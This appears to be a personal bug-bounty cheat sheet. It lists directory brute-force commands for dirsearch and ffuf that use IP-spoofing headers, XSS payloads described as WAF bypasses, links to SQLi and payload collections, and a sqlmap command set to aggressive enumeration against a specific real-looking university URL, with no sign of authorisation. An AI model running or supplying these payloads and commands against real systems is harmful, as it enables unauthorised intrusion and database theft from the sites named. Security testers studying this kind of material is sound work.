## Dir Buster

dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1

ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-Host: localhost" -t 100 -r -o results.json

[www.cspbypasser.com](http://cspbypass.com/)

Passive Url's: https://sawravchy.github.io/archivefinder/

Firefox Extensions:

https://github.com/kevin-mizu/domloggerpp?tab=readme-ov-file

https://chromewebstore.google.com/detail/sessionbox-multi-login-to/megbklhjamjbcafknkgmokldgolkdfig?hl=en

Hackbar: https://addons.mozilla.org/en-US/firefox/addon/maxs-hackbar/



Payloads:

https://github.com/coffinxp/lostools/blob/main/payloads/payloads/xor.txt
 https://tib3rius.com/sqli

 XSS: WAF <details/open/id="&quote;"ontoggle=[JS]>

<details/open/id="&quote;"ontoggle=[JS]>

<details open id="' &quote;'"ontoggle=[JS]>
 
https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

 Practice: https://www.bugbountyhunter.com/

 Nuclei Teamplates: https://nuclei-templates.netlify.app/#q=pdteam

 Proxy Chains Socks: https://github.com/TheSpeedX/PROXY-List

 Writeups: https://www.bugbountyhunting.com/

 Encoder/Decoder: https://dencode.com/

Broken Link Hijacking: https://github.com/H4cker-Nafeed/Nafeed-Broken-Link

Burp Extensions: https://portswigger.net/bappstore/b4915681326648b1a12e4059d71bc909

Writeups: https://github.com/reddelexc/hackerone-reports/tree/master/tops_by_bug_type

SQL Map:sqlmap -u 
'https://cutm.ac.in/payu/skill/index.php?id=34' --batch --dbs --threads=5 --random-agent --risk=3 --level=5 --tamper=space2comment -v 3 --dbms  MySQL

Wayback Url: https://web.archive.org

Cyberchef : https://gchq.github.io/CyberChef/
reference : https://pentestbook.six2dez.com
jwt : Jwt.io

Notion Notes: https://ember-sunday-c9a.notion.site/BSCP-1017bd73434580d6b98fe22fab9560c0?pvs=4
